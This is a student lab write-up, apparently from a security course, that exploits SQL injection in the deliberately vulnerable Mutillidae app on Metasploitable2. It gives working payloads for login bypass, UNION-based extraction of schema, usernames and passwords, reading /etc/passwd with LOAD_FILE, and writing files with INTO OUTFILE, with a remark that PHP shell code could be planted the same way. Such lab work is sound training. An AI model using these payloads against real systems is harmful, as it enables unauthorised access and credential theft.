# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2
![image](https://github.com/22003197/sqlinjection/assets/124332243/636d70bb-b90f-455b-8df6-2875f7074b35)
Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![image](https://github.com/22003197/sqlinjection/assets/124332243/5533adf3-2757-458d-a9db-bcf0172b955d)
Select Multidae from the menu listed as shown above. You will get the page as displayed below:
![image](https://github.com/22003197/sqlinjection/assets/124332243/5757b3be-d88c-4b21-8ecb-11366f63ae07)
Click on the menu Login/Register and register for an account
![image](https://github.com/22003197/sqlinjection/assets/124332243/0807057e-6187-4975-8c08-a1839793eb1a)
Click on the link “Please register here”
![image](https://github.com/22003197/sqlinjection/assets/124332243/a7d8637e-2ebc-48ce-9455-c75b6b31ebfb)
Click on “Create Account” to display the following page:
![image](https://github.com/22003197/sqlinjection/assets/124332243/c58342b5-ef01-452d-8b14-666b8a67a1cb)
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
![image](https://github.com/22003197/sqlinjection/assets/124332243/cb8881ec-9db1-4a98-8bf1-c0e3698d3a9e)
Click “Login”. The logged in page will show as below:
![image](https://github.com/22003197/sqlinjection/assets/124332243/d16cdb91-fe80-4829-ba94-deed09df4d6b)
##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
![image](https://github.com/22003197/sqlinjection/assets/124332243/20b1af62-50db-450e-890f-0ef5757b13a1)
Click the login button and you will see it enter into the administrator page.
![image](https://github.com/22003197/sqlinjection/assets/124332243/9a20f889-bfe9-4f56-b78c-70e7d4ec06b9)
## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”
![image](https://github.com/22003197/sqlinjection/assets/124332243/69bb43f0-a9de-4a17-9610-6e4b65b0fe72)
![image](https://github.com/22003197/sqlinjection/assets/124332243/ca992da6-6d54-40c6-9772-a973e01d0606)
![image](https://github.com/22003197/sqlinjection/assets/124332243/e98005b1-cb87-40b6-81e5-a1db9cae4757)
![image](https://github.com/22003197/sqlinjection/assets/124332243/213068f7-1af4-47bf-8e57-a8b7ae782e15)
![image](https://github.com/22003197/sqlinjection/assets/124332243/06d96ed2-89ae-423c-bc5a-1796189b79d4)
From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
After logging out, Now choose the menu as shown below: img
![image](https://github.com/22003197/sqlinjection/assets/124332243/2d175e27-60c8-4de1-8adc-2900634e83e8)
Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/22003197/sqlinjection/assets/124332243/04294af8-107e-4af6-9ac3-c91c9c5917cf)
After adding the order by 6 into the existing url , the following error statement will be obtained:
![image](https://github.com/22003197/sqlinjection/assets/124332243/30d2672c-ea6b-4314-add0-53168e3ce688)
When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![image](https://github.com/22003197/sqlinjection/assets/124332243/eaa950ff-9c0b-45df-958d-9b50acb4811c)
![image](https://github.com/22003197/sqlinjection/assets/124332243/7d34d6a0-39e0-4cfc-b664-ce4b6c867de1)
As it is having 5 columns the query worked fine and it provides the correct result
![image](https://github.com/22003197/sqlinjection/assets/124332243/b29389af-5aa1-46a1-8ad9-d254fb7ddb1b)
Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![image](https://github.com/22003197/sqlinjection/assets/124332243/621881c7-23e6-4cc5-bd14-0f2ef9c767ea)
As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![image](https://github.com/22003197/sqlinjection/assets/124332243/7ccb298a-30e5-4b0e-a8d8-513b28092611)
Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/22003197/sqlinjection/assets/124332243/60800813-2785-4782-bdef-dd5d7af5f9de)
The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/22003197/sqlinjection/assets/124332243/69ed7078-7c25-4829-b5d6-b40ffcf5877e)
The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![image](https://github.com/22003197/sqlinjection/assets/124332243/1a95a44a-85e5-4cd4-a604-58645079ece6)
The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/22003197/sqlinjection/assets/124332243/dcc33212-e3b9-4cbf-a397-0212cfd69766)
Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/22003197/sqlinjection/assets/124332243/279d8d68-b498-4f1b-ba41-9a013ff380d8)
## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/22003197/sqlinjection/assets/124332243/048e3298-7240-4103-aec4-fa0f9cbd354e)
the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
